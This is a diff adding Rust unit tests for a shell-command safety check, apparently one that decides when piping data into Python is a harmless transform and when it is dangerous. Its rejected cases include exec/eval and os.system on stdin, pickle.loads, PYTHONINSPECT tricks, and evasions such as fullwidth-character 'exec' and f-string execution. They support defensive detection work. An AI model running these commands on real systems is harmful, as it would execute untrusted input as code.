+            "kubectl get pods -o json | python3 -m json.tool",
+            "cat data.json | python -m json.tool --sort-keys",
+            "cat data.json | python3 -m json.tool --indent 4",
+            "cat data.json | python3 -m json.tool --indent=4 --no-ensure-ascii",
+            "cat data.json | python3 -mjson.tool --compact",
+            "cat data.jsonl | python3 -m json.tool --json-lines --tab",
+            "cat data.json | python2 -m json.tool",
+        ] {
+            assert!(!fires_pipe_to_interpreter(input), "{input}");
+        }
+        for input in [
+            // Interpreter options before -m, unknown json.tool options, file
+            // operands (an output file is a write), redirections, prefix
+            // assignments and inspect mode all keep the finding.
+            "cat x | python3 -i -m json.tool",
+            "cat x | python3 -X importtime -m json.tool",
+            "cat x | python3 -W error -m json.tool",
+            "cat x | python3 -m json.tool -i",
+            "cat x | python3 -m json.tool --indent",
+            "cat x | python3 -m json.tool --indent x",
+            "cat x | python3 -m json.tool in.json",
+            "cat x | python3 -m json.tool - out.json",
+            "cat x | python3 -m json.tool > out.json",
+            "cat x | PYTHONINSPECT=1 python3 -m json.tool",
+            "export PYTHONINSPECT=1; cat x | python3 -m json.tool",
+            "cat x | python3 -m json.tools",
+            "cat x | python3 -m json",
+            "cat x | python3 -m pip install -r /dev/stdin",
+            r#"cat x | python3 -m "$MOD""#,
+        ] {
+            assert!(fires_pipe_to_interpreter(input), "{input}");
+        }
+    }
+
+    #[test]
+    fn fpperf_1_python_data_grammar_accepts_pure_stdin_transformations() {
+        for body in [
+            "import json,sys; print(json.dumps(json.load(sys.stdin), indent=2))",
+            "import sys; print(sys.stdin.read().upper())",
+            "import sys; print(len(sys.stdin.readlines()))",
+            "for l in sys.stdin: print(l.strip())",
+            "import sys\nfor l in sys.stdin:\n    print(l.strip())",
+            "import sys; [print(l.strip()) for l in sys.stdin]",
+            r#"import json,sys; d=json.load(sys.stdin); print(d["a"]["b"])"#,
+            "import json, sys\nd = json.load(sys.stdin)\nfor k, v in d.items():\n    print(k, v)",
+            r#"import json,sys; print("\n".join(sorted(json.load(sys.stdin).keys())))"#,
+            "import csv,sys; [print(row[0]) for row in csv.reader(sys.stdin)]",
+            r#"import re,sys; print(re.findall(r"\d+", sys.stdin.read()))"#,
+            "import json,sys\nprint(json.dumps(\n    json.load(sys.stdin),\n    sort_keys=True,\n))",
+            r#"import json,sys; d=json.load(sys.stdin); print(d.get("x", 0) + 1.5e3)"#,
+            "import sys; n = 0\nfor line in sys.stdin:\n    n += len(line)\nprint(n)",
+            "import json,sys; sys.stdout.write(json.dumps(json.load(sys.stdin)))",
+            "import ast,sys; print(ast.literal_eval(sys.stdin.read()))",
+        ] {
+            assert!(python_body_is_known_data_parser(body), "{body}");
+        }
+    }
+
+    #[test]
+    fn fpperf_1_python_data_grammar_rejects_code_paths() {
+        for body in [
+            // Code execution, reflection, files, processes, other modules.
+            "import sys; exec(sys.stdin.read())",
+            "import sys; eval(sys.stdin.read())",
+            "import sys; x = sys.stdin.read(); exec(x)",
+            r#"import sys; compile(sys.stdin.read(), "x", "exec")"#,
+            r#"import sys; getattr(sys, "modules")"#,
+            r#"import sys; sys.modules["os"].system(sys.stdin.read())"#,
+            r#"import sys; open("/tmp/x", "w").write(sys.stdin.read())"#,
+            "import os,sys; os.system(sys.stdin.read())",
+            "import subprocess,sys; subprocess.run(sys.stdin.read(), shell=True)",
+            "import sys,pickle; pickle.loads(sys.stdin.buffer.read())",
+            "import sys,importlib; importlib.import_module(sys.stdin.read())",
+            "import sys,code; code.interact()",
+            "import sys; breakpoint()",
+            "import sys; sys.stdin.read(); help()",
+            "import sys; print(input())",
+            "import sys; print(type(sys.stdin))",
+            // Aliases and rebinding of allowed names.
+            "import json as j,sys; print(j.load(sys.stdin))",
+            "from json import load; import sys; print(load(sys.stdin))",
+            "import sys; print = exec; print(sys.stdin.read())",
+            "import sys; sys.stdin.read = exec",
+            "import sys; json = sys; print(json.stdin.read())",
+            "import sys; (p := print)(sys.stdin.read())",
+            "import sys; d = {}; d[exec] = 1; exec(sys.stdin.read())",
+            "import sys; s = sys; s.modules",
+            "import sys; s = sys.stdin; print(s.read())",
+            // Hidden code: f-strings, t-strings, NFKC identifiers, dunders,
+            // keywords glued to numbers, lambdas, format traversal.
+            r#"import sys; x=sys.stdin.read(); print(f"{exec(x)}")"#,
+            r#"import sys; x=sys.stdin.read(); print(rf"{exec(x)}")"#,
+            r#"import sys; x=sys.stdin.read(); print(t"{exec(x)}")"#,
+            "import sys; \u{ff45}\u{ff58}\u{ff45}\u{ff43}(sys.stdin.read())",
+            "import json,sys; print(json.load(sys.stdin).__class__)",
+            "import sys; print(1or sys.stdin.read())",
+            "import sys; f = lambda: sys.stdin.read(); print(f())",
+            "import sys; print(sys.stdin.read().format(sys))",
+            // Unknown names and attributes; no stdin read at all.
+            "import sys; print(foo(sys.stdin.read()))",
+            "import sys; print(sys.stdin.buffer.read())",
+            "print(json.dumps({}))",
+            // Malformed quoting or brackets.
+            r#"import sys; print("x)"#,
+            "import sys; print(sys.stdin.read()",
+        ] {
+            assert!(!python_body_is_known_data_parser(body), "{body}");
+        }
+    }
+
+    #[test]
+    fn fpperf_1_literal_output_accepts_plain_strings_only() {
+        for body in [
+            "print()",
+            "print(1)",
+            r#"print("done")"#,
+            "print('done')",
+            r#"print("a\tb")"#,
+        ] {
+            assert!(python_body_is_literal_output(body), "{body}");
+        }
+        for body in [
+            r#"print(f"{1}")"#,
+            r#"print("a" + x)"#,
+            r#"print("a", "b")"#,
+            r#"print("a\")"#,
+            r#"print("a" "b")"#,
+            "print(x)",
+            "print('''a''')",
+        ] {
+            assert!(!python_body_is_literal_output(body), "{body}");
+        }
+        assert!(!fires_pipe_to_interpreter(
+            r#"ls | python3 -c 'print("done")'"#
+        ));
+        assert!(!fires_pipe_to_interpreter(
+            r#"ls | python3 -c "print('done')""#
         ));
     }
 
